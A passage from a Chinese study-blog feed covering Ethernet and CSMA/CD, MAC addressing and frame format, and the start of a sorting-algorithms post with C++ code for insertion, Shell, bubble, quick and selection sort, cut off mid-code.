E）都检测到不是发送给它们的数据帧，因此就丢弃这个数据帧而不能够收下来，从而在具有广播特性的总线上实现了一对一的通信。</p><p>为了通信的简便，以太网采取了两种重要的措施：</p><ol><li><p>采用较为灵活的无连接的工作方式，即不必先建立连接就可以直接发送数据。</p></li><li><p>以太网对发送的数据帧不进行编号，也不要求对方发回确认。</p><p>以太网提供的服务是不可靠的交付，即尽最大努力的交付。当目的站收到有差错的数据帧时就丢弃此帧，其他什么也不做。差错的纠正由高层来决定。如果高层发现丢失了一些数据而进行重传，但以太网并不知道这是一个重传的帧，而是当作一个新的数据帧来发送。 &#x20;</p></li></ol><p>这样做的理由是局域网信道的质量很好，因信道质量产生差错的概率是很小的。</p><p>以太网发送的数据都使用曼彻斯特(Manchester)编码，码元1是前高后低，码元0是前低后高，这就保证了在每一个比特的正中间出现一次电压的转换，而接收端就利用这种电压的转换很方便地把位同步信号提取出来。</p><p>但是从曼彻斯特编码的波形图可以看出，其所占频带宽度比原始的基带信号增加了一倍（因为每秒传送的码元数加倍了）。</p><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_BcS5yAacKB.png"></p><p>CSMA&#x2F;CD 表示 Carrier Sense Multiple Access with Collision etection，即<strong>载波监听、多点接入、碰撞检测</strong>。</p><ul><li><p>“<strong>多点接入</strong>”表示许多计算机以多点接入的方式连接在一根总线上。</p></li><li><p>“<strong>载波监听</strong>”是指每一个站在发送数据之前先要检测一下总线上是否有其他计算机在发送数据，如果有，则暂时不要发送数据，以免发生碰撞。&#x20;</p><p>总线上并没有什么“载波”。因此， “载波监听”就是用电子技术检测总线上有没有其他计算机发送的数据信号。</p></li><li><p>“<strong>碰撞检测</strong>”就是计算机边发送数据边检测信道上的信号电压大小。</p></li></ul><p>当几个站同时在总线上发送数据时，总线上的信号电压摆动值将会增大（互相叠加）。当一个站检测到的信号电压摆动值超过一定的门限值时，就认为总线上至少有两个站同时在发送数据，表明产生了碰撞。所谓“碰撞”就是发生了冲突。因此“碰撞检测”也称为“冲突检测”。</p><p>在发生碰撞时，总线上传输的信号产生了严重的失真，无法从中恢复出有用的信息来。</p><p>每一个正在发送数据的站，一旦发现总线上出现了碰撞，就要立即停止发送，免得继续浪费网络资源，然后等待一段随机时间后再次发送。</p><h3 id="4-3-1-电磁波在总线上的有限传播速率的影响"><a href="#4-3-1-电磁波在总线上的有限传播速率的影响" class="headerlink" title="4.3.1 电磁波在总线上的有限传播速率的影响"></a>4.3.1 电磁波在总线上的有限传播速率的影响</h3><p>当某个站监听到总线是空闲时，也可能总线并非真正是空闲的。A 向 B 发出的信息，要经过一定的时间后才能传送到 B。</p><p>B 若在 A 发送的信息到达 B 之前发送自己的帧(因为这时 B 的载波监听检测不到 A 所发送的信息)，则必然要在某个时间和 A 发送的帧发生碰撞。碰撞的结果是两个帧都变得无用。</p><p>因此，使用 CSMA&#x2F;CD 协议的以太网不能进行全双工通信而只能进行双向交替通信（半双工通信）。每个站在发送数据之后的一小段时间内，存在着遭遇碰撞的可能性。 这种发送的不确定性使整个以太网的平均通信量远小于以太网的最高数据率。</p><p>最先发送数据的A站在至多经过时间$2t$就可知道有没有发生碰撞，因此以太网的端到端往返时间$2t$又被称为<strong>争用期</strong>，也叫<strong>碰撞窗口</strong>。只有经过争用期时间还没有检测到碰撞，才能肯定这次发送不会发生碰撞。</p><h3 id="4-3-2-二进制指数类型退避算法"><a href="#4-3-2-二进制指数类型退避算法" class="headerlink" title="4.3.2 二进制指数类型退避算法"></a>4.3.2 二进制指数类型退避算法</h3><p>发生碰撞的站在停止发送数据后，要推迟（退避）一个随机时间才能再发送数据。</p><p>为了尽可能减小重传时再次发生冲突的概率，退避算法有以下具体的规定：</p><ol><li><p>基本退避时间取为争用期 2t，具体的争用期时间是51.2us。对于10M&#x2F;bits以太网在争用期可发送512比特，即64字节，也可以说争用期是512比特时间。</p></li><li><p>从整数集合$\left[0,1, \ldots,\left(2^{k}-1\right)\right]$中随机地取出一个数，记为 r。重传所需的时延就是 r 倍的基本退避时间。</p></li><li><p>参数 k 按下面的公式计算：</p><p>当 k ≤ 10 时，参数 k 等于重传次数。</p></li></ol><p>$$<br>k&#x3D; \min [重传次数, 10]<br>$$</p><ol start="4"><li>当重传达 16 次仍不能成功时即丢弃该帧，并向高层报告。</li></ol><p>如果发生冲突，就一定是在发送的前 64 字节之内。由于一检测到冲突就立即中止发送，这时已经发送出去的数据一定小于 64 字节。&#x20;</p><p>以太网规定了最短有效帧长为 64 字节，凡长度小于 64 字节的帧都是由于冲突而异常中止的无效帧。&#x20;</p><p>当发送数据的站一旦发现发生了碰撞时：</p><ol><li>立即停止发送数据；</li><li>再继续发送若干比特的**人为干扰信号(jamming signal)**，以便让所有用户都知道现在已经发生了碰撞。&#x20;</li></ol><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_nrUuaeRdQ4.png"></p><p>B 也能够检测到冲突，并立即停止发送数据帧，接着就发送干扰信号。这里为了简单起见，只画出 A 发送干扰信号的情况。</p><p>以太网还规定了帧间最小间隔为9.6us，相当于96比特时间，这样做是为了使刚刚收到数据帧的站的接收缓存来得及清理，做好接受下一帧的准备。</p><h2 id="4-4-使用广播信道的以太网"><a href="#4-4-使用广播信道的以太网" class="headerlink" title="4.4 使用广播信道的以太网"></a>4.4 使用广播信道的以太网</h2><h3 id="4-4-1-使用集线器的星形拓扑"><a href="#4-4-1-使用集线器的星形拓扑" class="headerlink" title="4.4.1 使用集线器的星形拓扑"></a>4.4.1 使用集线器的星形拓扑</h3><p>传统以太网最初是使用粗同轴电缆，后来演进到使用比较便宜的细同轴电缆，最后发展为使用更便宜和更灵活的双绞线。</p><p>这种以太网采用星形拓扑，在星形的中心则增加了一种可靠性非常高的设备，叫做集线器(hub)  。集线器使用了大规模集成电路芯片，因此这样的硬件设备的可靠性已大大提高了。&#x20;</p><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_N1d30O3xqu.png"></p><p>每个站需要使用两对无屏蔽双绞线（放在同一根电缆中），分别用于发送和接受。</p><p>1990年IEEE制作出星形网 10BASE-T的标准802.3i。</p><ul><li>10代表10Mbit&#x2F;s的数据率</li><li>BASE代表连接线上的信号是基带信号</li><li>T代表双绞线</li></ul><p>这种 10 Mb&#x2F;s 速率的无屏蔽双绞线星形网的出现，既降低了成本，又提高了可靠性。但10BASE-T 的通信距离稍短，每个站到集线器的距离不超过 100 m。10BASE-T 双绞线以太网的出现，是局域网发展史上的一个非常重要的里程碑，它为以太网在局域网中的统治地位奠定了牢固的基础。&#x20;</p><p>集线器的一些特点：</p><ol><li>集线器是使用电子器件来模拟实际电缆线的工作，因此整个系统仍然像一个传统的以太网那样运行。&#x20;</li><li>使用集线器的以太网在逻辑上仍是一个总线网，各工作站使用的还是 CSMA&#x2F;CD 协议，并共享逻辑上的总线。</li><li>集线器很像一个多接口的转发器，工作在物理层，不进行碰撞检测。</li></ol><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_i2sHBpkCvl.png"></p><ol><li>集线器一般都有少量的容错能力和网络管理能力。</li></ol><h3 id="4-4-2-以太网的-MAC-层"><a href="#4-4-2-以太网的-MAC-层" class="headerlink" title="4.4.2 以太网的 MAC 层"></a>4.4.2 以太网的 MAC 层</h3><h4 id="4-4-2-1-MAC-层的硬件地址"><a href="#4-4-2-1-MAC-层的硬件地址" class="headerlink" title="4.4.2.1 MAC 层的硬件地址"></a>4.4.2.1 MAC 层的硬件地址</h4><p>在局域网中，硬件地址又称为物理地址，或 MAC 地址。802 标准所说的“地址”严格地讲应当是每一个站的“名字”或标识符。&#x20;</p><p>IEEE 802规定MAC地址字段使用6字节（48位）。</p><ul><li>IEEE 的注册管理机构 RA 负责向厂家分配地址字段的前三个字节(即高位 24 位)。</li><li>地址字段中的后三个字节(即低位 24 位)由厂家自行指派，称为扩展标识符，必须保证生产出的适配器没有重复地址。</li></ul><p>一个地址块可以生成$2^{24}$个不同的地址。这种 48 位地址称为 MAC-48，它的通用名称是EUI-48。</p><p>“MAC地址”实际上就是适配器地址或适配器标识符EUI-48。</p><h4 id="4-4-2-2-适配器检查-MAC-地址-xD"><a href="#4-4-2-2-适配器检查-MAC-地址-xD" class="headerlink" title="4.4.2.2 适配器检查 MAC 地址 &#xD;"></a>4.4.2.2 适配器检查 MAC 地址 &#xD;</h4><p>适配器从网络上每收到一个 MAC 帧就首先用硬件检查 MAC 帧中的 MAC 地址：</p><ul><li>如果是发往本站的帧则收下，然后再进行其他的处理。</li><li>否则就将此帧丢弃，不再进行其他的处理。</li></ul><p>“发往本站的帧”包括以下三种帧：</p><ul><li>单播(unicast)帧（一对一）</li><li>广播(broadcast)帧（一对全体）</li><li>多播(multicast)帧（一对多）</li></ul><p>所有的适配器都至少应当能够识别前两种帧，有的适配器可用编程的方法识别多播地址。</p><h4 id="4-4-2-3-MAC-帧的格式"><a href="#4-4-2-3-MAC-帧的格式" class="headerlink" title="4.4.2.3 MAC 帧的格式"></a>4.4.2.3 MAC 帧的格式</h4><p>常用的以太网MAC帧格式有两种标准：</p><ol><li>DIX Ethernet V2 标准</li><li>IEEE 的 802.3 标准</li></ol><p>最常用的 MAC 帧是以太网 V2 的格式。</p><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_3Wocca0fEy.png"></p><ul><li>类型字段：用来标志上一层使用的是什么协议，<br>以便把收到的 MAC 帧的数据上交给上一层的这个协议。&#x20;</li><li>数据字段：正式名称是 MAC 客户数据字段，最小长度 64 字节 - 18 字节的首部和尾部 &#x3D; 数据字段的最小长度。</li><li>FCS：帧检验序列，当传输媒体的误码率为$1 \times 10^{-8}$时， MAC 子层可使未检测到的差错小于$1 \times 10^{-14}$。&#x20;</li></ul><p>当数据字段的长度小于 46 字节时，应在数据字段的后面加入整数字节的填充字段，以保证以太网的 MAC 帧长不小于 64 字节。&#x20;</p><p>在帧的前面插入的 8 字节中的第一个字段共 7 个字节，是前同步码，用来迅速实现 MAC 帧的比特同步。第二个字段是帧开始定界符，表示后面的信息就是MAC 帧。 为了达到比特同步，在传输媒体上实际传送的要比 MAC 帧还多 8 个字节。</p><p>以太网不需要封装成帧和透明传输，因为可以使用曼彻斯特编码来识别是否是同一个帧。</p><p>以下情况为无效的 MAC 帧：</p><ol><li>帧的长度不是整数个字节；</li><li>用收到的帧检验序列 FCS 查出有差错；</li><li>数据字段的长度不在 46 ~ 1500 字节之间。</li></ol><p>对于检查出的无效 MAC 帧就简单地丢弃。以太网不负责重传丢弃的帧。&#x20;</p><hr><h1 id="5-扩展的以太网"><a href="#5-扩展的以太网" class="headerlink" title="5 扩展的以太网"></a>5 扩展的以太网</h1><p>讨论如何把以太网的覆盖范围扩展。</p><p>在物理层扩展局域网：主机使用光纤和一对光纤调制解调器连接到集线器。</p><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_3qxcgK1jM-.png"></p><p>光纤调制解调器的作用就是进行电信号和光信号的转换，光纤的时延很小，并且带宽很宽，因此可以很容易使主机和几公里之外的集线器相连接。</p><p>用多个集线器可连成更大的局域，某大学有三个系，各自有一个局域网。</p><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_8caVwXWgAa.png"></p><p>用集线器组成更大的局域网都在一个碰撞域中。</p><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_CuFlIqA6jw.png"></p><h2 id="5-1-在数据链路层扩展以太网"><a href="#5-1-在数据链路层扩展以太网" class="headerlink" title="5.1 在数据链路层扩展以太网"></a>5.1 在数据链路层扩展以太网</h2><p><img src="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image_fwCTB72h3q.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构第8章：排序</title>
      <link href="/2024/06/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E6%8E%92%E5%BA%8F/"/>
      <url>/2024/06/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="1-总览"><a href="#1-总览" class="headerlink" title="1 总览"></a>1 总览</h1><ol><li><p><strong>比较类排序</strong>：通过比较来决定元素间的相对次序，由于其时间复杂度不能突破O(nlogn)，因此也称为非线性时间比较类排序。 包括插入排序、希尔排序、选择排序、堆排序、冒泡排序、快速排序和归并排序。</p></li><li><p><strong>非比较类排序</strong>：不通过比较来决定元素间的相对次序，它可以突破基于比较排序的时间下界，以线性时间运行，因此也称为线性时间非比较类排序。包括计数排序、桶排序和基数排序。</p></li></ol><ul><li><strong>稳定</strong>：如果a原本在b前面，若a&#x3D;b，那么排序之后a仍然在b的前面。</li><li><strong>不稳定</strong>：如果a原本在b前面，若a&#x3D;b，那么排序之后a可能在b的后面。</li></ul><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D67peceibeISwc3aGibUlvZ0XqVnbWtBRiaKhGcwh6KibXbSiadtHqwgjmmzBYCa2DNuj5Vhw3lHc96z1wge3ZbDAeg/640?wx_fmt=png" alt="alt text"></p><hr><h1 id="2-内部排序算法介绍"><a href="#2-内部排序算法介绍" class="headerlink" title="2 内部排序算法介绍"></a>2 内部排序算法介绍</h1><h2 id="2-1-插入排序"><a href="#2-1-插入排序" class="headerlink" title="2.1 插入排序"></a>2.1 插入排序</h2><p>类似于打扑克牌，插入排序是一种最简单直观的排序算法，它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。</p><h3 id="2-1-1-直接插入排序"><a href="#2-1-1-直接插入排序" class="headerlink" title="2.1.1 直接插入排序"></a>2.1.1 直接插入排序</h3><p><strong>算法思想</strong></p><ol><li>将第一待排序序列第一个元素看做一个有序序列，把第二个元素到最后一个元素当成是未排序序列。</li><li>从头到尾依次扫描未排序序列，将扫描到的每个元素插入有序序列的适当位置。（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面。）</li></ol><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：$O(n²)$</li><li>空间复杂度：$O(1)$</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接插入排序</span></span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert_sort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i ++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> val = a[i], j;</span><br><span class="line"><span class="keyword">for</span> (j = i; j &gt; <span class="number">1</span> &amp;&amp; a[j - <span class="number">1</span>] &gt; val; j --)</span><br><span class="line">a[j] = a[j - <span class="number">1</span>];</span><br><span class="line">a[j] = val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>动图演示</strong></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1654613/oo2i3qbjei.gif" alt="alt text"></p><h3 id="2-1-2-折半插入排序"><a href="#2-1-2-折半插入排序" class="headerlink" title="2.1.2 折半插入排序"></a>2.1.2 折半插入排序</h3><p>插入排序和冒泡排序一样，也有一种优化算法，叫做拆半插入。</p><p><strong>算法思想</strong></p><p>在直接插入排序算法中，总是边比较边移动元素，可以将比较和移动操作分离，即先折半查找出元素的待插入位置，然后统一地移动待插入位置之后的所有元素。</p><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：$O(n²)$</li><li>空间复杂度：$O(1)$</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 折半插入排序</span></span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">halfway_insert_sort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i ++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> val = a[i];</span><br><span class="line"><span class="comment">// 需要找到第一个大于a[i]的数的位置</span></span><br><span class="line"><span class="type">int</span> l = <span class="number">1</span>, r = i;</span><br><span class="line"><span class="keyword">while</span> (l &lt; r)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (a[mid] &lt;= val) l = mid + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> r = mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将[r, i - 1]之间的数移动到[r + 1, i]</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i; j &gt; r; j --)</span><br><span class="line">a[j] = a[j - <span class="number">1</span>];</span><br><span class="line">a[r] = val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>折半插入排序仅减少了比较元素的次数，但元素的移动次数并未改变，时间复杂度仍为$O(n^2)$。</li></ul><h3 id="2-1-3-希尔排序（缩小增量排序）"><a href="#2-1-3-希尔排序（缩小增量排序）" class="headerlink" title="2.1.3 希尔排序（缩小增量排序）"></a>2.1.3 希尔排序（缩小增量排序）</h3><p><strong>算法思想</strong></p><p>希尔排序，也称递减增量排序算法，是插入排序的一种更高效的改进版本。但希尔排序是<strong>非稳定</strong>排序算法。</p><p>希尔排序是基于插入排序的以下两点性质而提出改进方法的：</p><ul><li>插入排序在对几乎已经排好序的数据操作时，效率高，即可以达到线性排序的效率；</li><li>但插入排序一般来说是低效的，因为插入排序每次只能将数据移动一位；</li></ul><p>希尔排序的基本思想是：先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录“基本有序”时，再对全体记录进行依次直接插入排序。</p><p><strong>算法步骤</strong></p><ol><li>选择一个增量序列 t1，t2，……，tk，其中 ti &gt; tj, tk &#x3D; 1；</li><li>按增量序列个数 k，对序列进行 k 趟排序；</li><li>每趟排序，根据对应的增量 $t_i$，将待排序列分割成若干长度为 m 的子序列，分别对各子表进行直接插入排序。仅增量因子为 1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</li></ol><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：希尔排序的时间复杂度会随着ti选取策略的不同而发生变化，但是通常保持在$O(n^{1.3}) \sim O(n^{1.5})$</li><li>空间复杂度：$O(1)$</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 希尔排序</span></span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell_sort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> gap = n / <span class="number">2</span>; gap; gap /= <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = gap + <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line"><span class="keyword">if</span> (a[i] &lt; a[i - gap])</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> val = a[i], j;</span><br><span class="line"><span class="keyword">for</span> (j = i - gap; j &gt; <span class="number">0</span> &amp;&amp; val &lt; a[j]; j -= gap)</span><br><span class="line">a[j + gap] = a[j];</span><br><span class="line">a[j + gap] = val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>动图演示</strong></p><p><img src="https://img-blog.csdnimg.cn/14642c0b17cc41a496c808ed6214b234.gif#pic_center" alt="alt text"></p><hr><h2 id="2-2-交换排序"><a href="#2-2-交换排序" class="headerlink" title="2.2 交换排序"></a>2.2 交换排序</h2><p>所谓交换，是指根据序列中两个元素关键字的比较结果来对换这两个记录在序列中的位置。</p><h3 id="2-2-1-冒泡排序"><a href="#2-2-1-冒泡排序" class="headerlink" title="2.2.1 冒泡排序"></a>2.2.1 冒泡排序</h3><p>冒泡排序是一种<strong>稳定</strong>的排序算法。</p><p><strong>算法思想</strong></p><ol><li>比较相邻的元素。如果第一个比第二个大，就交换它们两个</li><li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对，这样在最后的元素应该会是最大的数；</li><li>针对所有的元素重复以上的步骤，除了最后一个；</li><li>重复步骤1~3，直到排序完成。</li></ol><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：O(n²)</li><li>空间复杂度：O(1)</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 冒泡排序</span></span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bubble_sort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = n; i &gt; <span class="number">1</span>; i --)</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; i; j ++)</span><br><span class="line"><span class="keyword">if</span> (a[j] &gt; a[j + <span class="number">1</span>])</span><br><span class="line"><span class="built_in">swap</span>(a[j], a[j + <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>动图演示</strong></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1654613/4iifndesx2.gif" alt="alt text"></p><h3 id="2-2-2-快速排序"><a href="#2-2-2-快速排序" class="headerlink" title="2.2.2 快速排序"></a>2.2.2 快速排序</h3><p>快速排序是由东尼·霍尔所发展的一种排序算法。在平均状况下，排序 n 个项目要 Ο(nlogn) 次比较。在最坏状况下则需要 Ο(n²) 次比较，但这种状况并不常见。事实上，快速排序通常明显比其他 Ο(nlogn) 算法更快，因为它的内部循环（inner loop）可以在大部分的架构上很有效率地被实现出来。</p><p>快速排序使用分治法（Divide and conquer）策略来把一个串行（list）分为两个子串行（sub-lists）。</p><p>快速排序的最坏运行情况是 O(n²)，比如说顺序数列的快排。但它的平摊期望时间是 O(nlogn)，且 O(nlogn) 记号中隐含的常数因子很小，比复杂度稳定等于 O(nlogn) 的归并排序要小很多。所以，对绝大多数顺序性较弱的随机数列而言，快速排序总是优于归并排序。</p><ul><li>在递归的过程中，并不产生有序子序列，但每趟排序后会将枢轴（基准）元素放到其最终的位置上。</li></ul><p><strong>算法思想</strong></p><ol><li>从数列中挑出一个元素，称为 “基准”（pivot）;</li><li>重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作;</li><li>递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序；</li></ol><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：O(nlogn)</li><li>空间复杂度：O(logn)，递归栈的平均深度为logn</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 快速排序</span></span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> ;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> k = a[l + r &gt;&gt; <span class="number">1</span>], i = l - <span class="number">1</span>, j = r + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt; j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span> i ++; <span class="keyword">while</span> (a[i] &lt; k);</span><br><span class="line"><span class="keyword">do</span> j --; <span class="keyword">while</span> (a[j] &gt; k);</span><br><span class="line"><span class="keyword">if</span> (i &lt; j) <span class="built_in">swap</span>(a[i], a[j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">quick_sort</span>(l, j);</span><br><span class="line"><span class="built_in">quick_sort</span>(j + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>动图演示</strong></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1654613/uysmsku31g.gif" alt="alt text"></p><p><strong>算法改进</strong></p><ol><li>随机法选择枢轴元素</li><li>选择待排序数组的中间位置的数作为枢轴元素</li></ol><h2 id="2-3-选择排序"><a href="#2-3-选择排序" class="headerlink" title="2.3 选择排序"></a>2.3 选择排序</h2><p>选择排序的基本思想是：每一趟（如第 i 趟）在后面 n - i + 1 个待排序元素中选取关键字最小的元素，作为有序子序列的第 i 个元素，直到第 n - 1 趟遍历完。</p><h3 id="2-3-1-简单选择排序"><a href="#2-3-1-简单选择排序" class="headerlink" title="2.3.1 简单选择排序"></a>2.3.1 简单选择排序</h3><p>每次选择一个最小的元素与其进行交换。</p><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：O(n²)</li><li>空间复杂度：O(1)</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 简单选择排序</span></span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">select_sort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i ++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> id = i;  <span class="comment">// 记录最小值对应的数组下标</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt;= n; j ++)</span><br><span class="line"><span class="keyword">if</span> (a[j] &lt; a[id]) id = j;</span><br><span class="line"><span class="built_in">swap</span>(a[i], a[id]);</span><br><span class="line">&#125;</span><br><span 